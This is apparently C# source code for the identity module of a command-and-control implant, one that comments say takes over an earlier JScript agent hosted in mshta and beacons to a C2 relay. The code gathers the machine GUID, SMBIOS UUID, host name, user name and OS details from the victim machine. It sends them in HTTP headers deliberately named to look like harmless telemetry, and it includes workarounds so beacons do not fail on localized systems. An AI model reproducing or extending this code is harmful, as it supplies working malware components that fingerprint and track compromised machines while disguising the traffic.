using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace CSharpAgent
{
    // Builds the identity header set (API 1 — X-Device-Id et al., deliberately boring
    // telemetry-client names) — the SAME contract the JScript agent
    // ships, so an upgrade takeover keeps ONE stable agent row: the UUID is the same MachineGuid
    // the JScript agent reads, and every field is derived the same way. The differences from
    // the JScript agent are exactly two: X-Client-Id is 2 (this breed) and
    // X-Client-Features carries ONLY the UpgradeNative bit (category 4 → 1000000000000000).
    internal static class Identity
    {
        internal const string Capabilities = "1000000000000000";
        internal const int BreedId = 2;

        // A RANDOM per-RUNTIME key — NOT identity. A fresh value on every process launch
        // (one static initializer per AppDomain; Beacon.Run sends these headers on every
        // POST), shipped as X-Session-Id so the relay/C2 can tell agent RUNTIMES
        // apart on one machine: the machine uuid stays THE identity rows are keyed by, the
        // session key distinguishes concurrent or succeeding processes — after a 0x0B
        // UpgradeNetFramework takeover the beacons of the SAME machine uuid carry a NEW
        // key (ours), making the JS→C# handover visible. Identifies, authorizes nothing.
        private static readonly string SessionKey = Guid.NewGuid().ToString("D").ToLowerInvariant();

        internal static string[][] Build()
        {
            // CANONICAL machine uuid = the MachineGuid an x86 process sees (the Wow6432Node
            // copy on a 64-bit host) — that is the only view the JScript breed can reach, so
            // it is the view every breed must use. MachineGuid IS bitness-visible: HKLM\SOFTWARE
            // redirects for 32-bit readers, and the two copies hold DIFFERENT GUIDs on many
            // machines, so a breed that follows its host's bitness (Registry.GetValue / default
            // view) mints a second agent row on the same target. Chain, identical to the
            // JScript agent's: 32-bit-view MachineGuid → SMBIOS UUID → omit (nullable — never
            // a random GUID, never a placeholder; the relay reads a missing header as
            // identity-less).
            var guid = MachineGuid32View();
            if (!LooksLikeGuid(guid)) guid = SmbiosUuid();
            if (!LooksLikeGuid(guid)) guid = "";

            var machineArch = MachineArch();
            var processArch = ProcessArch();
            var version = OsVersion();

            // REQUIRED headers carry compile-time constants. Every detection-derived field
            // is OPTIONAL: a value that could not be detected OMITS the header — never sent
            // as "" — so the relay/C2 see "not reported" instead of a fabricated default.
            // There is NO Bitness header: the process arch already carries the full width,
            // and x86_64/aarch64 are both 64-bit — a bare bit flag would say nothing about
            // which.
            var headers = new List<string[]>
            {
                new[] { "X-Api-Version", "1" },
                new[] { "X-Platform", "Windows" },
                new[] { "X-Client-Id", BreedId.ToString() },
                new[] { "X-Client-Features", Capabilities }
            };
            AddOptional(headers, "X-Device-Id", guid);
            AddOptional(headers, "X-Session-Id", SessionKey);
            AddOptional(headers, "X-Device-Name", Environment.MachineName);
            AddOptional(headers, "X-User-Id", Environment.UserName);
            AddOptional(headers, "X-Device-Arch", machineArch);
            AddOptional(headers, "X-App-Arch", processArch);
            AddOptional(headers, "X-OS-Version", version);
            AddOptional(headers, "X-OS-Build", BuildNumber(version));

            // SANITIZE BEFORE THE WIRE — CLR2's WebHeaderCollection.Add rejects any value
            // char whose LOW BYTE is a control char or DEL: b = c & 0xFF is fatal when
            // (b < 0x20 && b != tab) || b == 0x7F. Swept empirically across the whole BMP on
            // 2.0.50727 — this exact rule, zero mismatches: Cyrillic А-П (U+0410-U+041F,
            // low bytes 0x10-0x1F) THROW "value contains invalid control characters" while
            // а-я pass; U+200B throws; U+0080-U+009F pass. A localized box whose machine or
            // user name carries such letters died on POST #1 before a byte hit the network —
            // the Win7 hunt threw the SAME popup twice because the first sanitizer kept
            // Cyrillic. CLR4 only rejects real control chars, so this stricter rule is safe
            // on both sides. A value that needs ANY cleaning is garbage for the wire: the
            // OPTIONAL header is OMITTED entirely (never half-stripped — "not reported"
            // beats a mangled name). X-Device-Id/X-Session-Id are hex+dash and can never
            // bite; the fields that can (X-Device-Name, X-User-Id) are display metadata,
            // not identity — the row stays keyed by X-Device-Id. The JScript agent never
            // hits this: WinHttpRequest.SetRequestHeader validates nothing, so its Cyrillic
            // names ride fine and the row keeps showing them after a takeover.
            var omitted = new List<string>();
            for (var i = headers.Count - 1; i >= 0; i--)
            {
                if (WireSafe(headers[i][1])) continue;
                omitted.Add(headers[i][0]);
                headers.RemoveAt(i);
            }
            LastCleaningNote = omitted.Count == 0
                ? ""
                : "OMITTED — wire-unsafe chars: " + string.Join(", ", omitted.ToArray());
            return headers.ToArray();
        }

        /// <summary>What the last Build() had to omit, "" when nothing — diag-only.</summary>
        internal static string LastCleaningNote = "";

        /// <summary>True when every char survives CLR2's header-value check: its low byte
        /// must not be a control char (tab excepted) or DEL. Exact CLR2 rule — see the
        /// comment at the call site.</summary>
        private static bool WireSafe(string value)
        {
            for (var i = 0; i < value.Length; i++)
            {
                var b = value[i] & 0xFF;
                if ((b < 0x20 && b != 0x09) || b == 0x7F) return false;
            }
            return true;
        }

        /// <summary>Appends an OPTIONAL identity header only when its detection produced a
        /// value — omission is the wire form of "could not detect" (agents never send empty
        /// strings or placeholders).</summary>
        private static void AddOptional(List<string[]> headers, string name, string value)
        {
            if (!string.IsNullOrEmpty(value)) headers.Add(new[] { name, value });
        }

        private static bool LooksLikeGuid(string value)
        {
            if (value == null || value.Length != 36) return false;
            for (var i = 0; i < value.Length; i++)
            {
                var c = value[i];
                var dash = i == 8 || i == 13 || i == 18 || i == 23;
                if (dash) { if (c != '-') return false; }
                else if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f'))) return false;
            }
            return true;
        }

        /// <summary>MachineGuid read through the pinned 32-bit registry view — identical to what
        /// the x86-re-hosted JScript host's RegRead returns, regardless of which bitness hosts
        /// THIS assembly (x86 mshta takeover vs a 64-bit persistence/WMI host). On a 32-bit OS
        /// the flag is a no-op (single view). "" when unreadable.</summary>
        private static string MachineGuid32View()
        {
            try
            {
                const uint rrfRegSz = 0x02;
                const uint rrfSubkeyWow6432 = 0x00020000;
                var hkeyLocalMachine = new IntPtr(0x80000002L); // no sign extension on x64
                var data = new byte[128];
                var bytes = (uint)data.Length;
                uint type;
                if (NativeImports.RegGetValue(hkeyLocalMachine,
                        @"SOFTWARE\Microsoft\Cryptography", "MachineGuid",
                        rrfRegSz | rrfSubkeyWow6432, out type, data, ref bytes) != 0)
                    return "";
                var value = System.Text.Encoding.Unicode.GetString(data, 0, (int)bytes);
                var nul = value.IndexOf('\0');
                if (nul >= 0) value = value.Substring(0, nul);
                return value.ToLowerInvariant();
            }
            catch { }
            return "";
        }

        /// <summary>SMBIOS type-1 System UUID via GetSystemFirmwareTable('RSMB') — byte-for-byte
        /// the string Win32_ComputerSystemProduct.UUID returns, which is the JScript agent's
        /// fallback source. No WMI dependency (the fetch-compile ships a single System
        /// reference). "" when the tables carry no usable type-1 structure.</summary>
        private static string SmbiosUuid()
        {
            try
            {
                const uint rsmb = 0x52534D42;
                var size = NativeImports.GetSystemFirmwareTable(rsmb, 0, null, 0);
                if (size < 30) return ""; // 8-byte header + a minimal type-1 with the UUID
                var raw = new byte[size];
                if (NativeImports.GetSystemFirmwareTable(rsmb, 0, raw, size) != size) return "";

                var major = raw[1];
                var minor = raw[2];
                var length = (uint)(raw[4] | (raw[5] << 8) | (raw[6] << 16) | (raw[7] << 24));
                if (length > size - 8) length = size - 8;

                var pos = 0u;
                while (pos + 4 <= length)
                {
                    var type = raw[8 + pos];
                    var structLength = (uint)raw[8 + pos + 1];
                    if (structLength < 4 || pos + structLength > length) return "";
                    // Type 1 (System Information): the UUID sits at STRUCTURE offset 0x08
                    // (spec offsets include the 4-byte type/length/handle header), so a
                    // structure carrying the full 16 bytes must span at least 0x18 bytes.
                    // Real tables are 0x1B/0x1C long; some omit trailing string-index fields.
                    if (type == 1 && structLength >= 0x18)
                        return FormatSmbiosUuid(raw, (int)(8 + pos + 8), major, minor);
                    // Skip the formatted area, then the double-NUL-terminated string set.
                    pos += structLength;
                    var nulRun = 0;
                    while (pos < length)
                    {
                        var b = raw[8 + pos];
                        pos++;
                        if (b == 0) { nulRun++; if (nulRun == 2) break; }
                        else nulRun = 0;
                    }
                }
            }
            catch { }
            return "";
        }

        private static string FormatSmbiosUuid(byte[] raw, int offset, int major, int minor)
        {
            var uuid = new byte[16];
            Array.Copy(raw, offset, uuid, 0, 16);
            // SMBIOS ≥ 2.6 stores the first three fields little-endian; the canonical string
            // form (and Win32_ComputerSystemProduct.UUID) byte-swaps them back. Older tables
            // are already in string order.
            if (major > 2 || (major == 2 && minor >= 6))
            {
                Array.Reverse(uuid, 0, 4);
                Array.Reverse(uuid, 4, 2);
                Array.Reverse(uuid, 6, 2);
            }
            var hex = "0123456789abcdef";
            var chars = new char[36];
            var ci = 0;
            for (var i = 0; i < 16; i++)
            {
                if (i == 4 || i == 6 || i == 8 || i == 10) chars[ci++] = '-';
                chars[ci++] = hex[uuid[i] >> 4];
                chars[ci++] = hex[uuid[i] & 0x0F];
            }
            return new string(chars);
        }

        // Machine arch via GetNativeSystemInfo — WOW64-proof (the JScript agent takes the WMI
        // CPU Architecture code; the native call is its equivalent). Same output vocabulary:
        // 9 → x86_64, 0 → i386, 12 → aarch64.
        private static string MachineArch()
        {
            try
            {
                SYSTEM_INFO info;
                NativeImports.GetNativeSystemInfo(out info);
                if (info.wProcessorArchitecture == 9) return "x86_64";
                if (info.wProcessorArchitecture == 0) return "i386";
                if (info.wProcessorArchitecture == 12) return "aarch64";
            }
            catch { }
            var env = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432");
            if (string.IsNullOrEmpty(env)) env = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            return MapArchName(env);
        }

        // Process arch from PROCESSOR_ARCHITECTURE (the arch of the process we run IN — the
        // x86 mshta host under EnsureX86Host reports x86). Unmapped values contribute "".
        private static string ProcessArch()
        {
            return MapArchName(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
        }

        private static string MapArchName(string value)
        {
            if (value == "AMD64") return "x86_64";
            if (value == "x86") return "i386";
            if (value == "ARM64") return "aarch64";
            return "";
        }

        // OS version via RtlGetVersion — the truthful source (Environment.OSVersion inherits
        // the host manifest's compatibility lies on Windows 8.1+; the JScript agent uses WMI
        // for the same reason). Format: "major.minor.build" — X-OS-Build is its tail.
        private static string OsVersion()
        {
            try
            {
                var info = new OSVERSIONINFOW();
                info.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOW));
                if (NativeImports.RtlGetVersion(ref info) == 0)
                    return info.dwMajorVersion + "." + info.dwMinorVersion + "." + info.dwBuildNumber;
            }
            catch { }
            var v = Environment.OSVersion.Version;
            return v.Major + "." + v.Minor + "." + v.Build;
        }

        private static string BuildNumber(string osVersion)
        {
            if (osVersion == null) return "";
            var lastDot = osVersion.LastIndexOf('.');
            return lastDot < 0 ? osVersion : osVersion.Substring(lastDot + 1);
        }
    }
}
